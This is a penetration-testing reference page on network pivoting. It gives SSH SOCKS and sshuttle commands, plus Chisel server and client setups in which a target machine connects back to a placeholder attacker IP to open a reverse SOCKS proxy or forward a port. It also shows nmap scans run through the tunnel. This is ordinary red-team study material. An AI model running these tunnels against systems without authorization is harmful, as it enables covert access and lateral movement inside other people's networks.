---
description: MITRE ATT&CK, Command and Control, Technique T1572
---

# Pivoting

### Pivoting with SSH

```bash
# Pivoting with an SSH SOCKS proxy
ssh -D $port -q -C -N parzival@$ip

# Pivoting with SSHuttle 
## https://github.com/sshuttle/sshuttle
sshuttle -vr parzival@$ip $targetSubnet/24
```

### Setting up a SOCKS Proxy with Chisel

1\. Download the [latest Chisel binaries](https://github.com/jpillora/chisel)

> Note, you will need a binary placed on your attacking system and one to be uploaded to the target system.

2\. On the attacking system:

```bash
./chisel server --socks5 --reverse -p 8000
```

3\. On the target system:&#x20;

```bash
.\chisel.exe client $attackerip:8000 R:socks
```

4\. Observe on the attacking system that the SOCKS5 connection has been successfully established.

#### Forwarding One Port with Chisel

1\. On the attacking system:

```bash
./chisel server 9000 -reverse
```

2\. On the target system:&#x20;

```bash
.\chisel client $attackerip:9000 R:$localport:127.0.0.1:$remoteport
```

#### Verification

The easiest way to verify if your `Chisel` connection was successful is to run the following command:&#x20;

```bash
ss -lnpt | grep $localport
```

#### Interaction

Ensure to remember that you will be interacting with `localhost` after forwarding a port. For example, by running&#x20;

```bash
nmap -sC -sV -p3306 -n localhost
```

### Nmap Scanning through Proxychains

When performing scans on the network through proxychains it is important to use the `-sT` flag. The following command demonstrates an Nmap command to use:

```bash
nmap -sT -Pn -n $port
```

{% hint style="warning" %}
You do not need this if you're utilizing SOCKS5 as it supports both ICMP and DNS.
{% endhint %}

### References

#### SSH

{% embed url="https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d" %}

{% embed url="https://anubissec.github.io/How-To-Pivot-Into-Target-Network-With-SSH/" %}

#### Chisel

{% embed url="https://ap3x.github.io/posts/pivoting-with-chisel" %}

{% embed url="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" %}
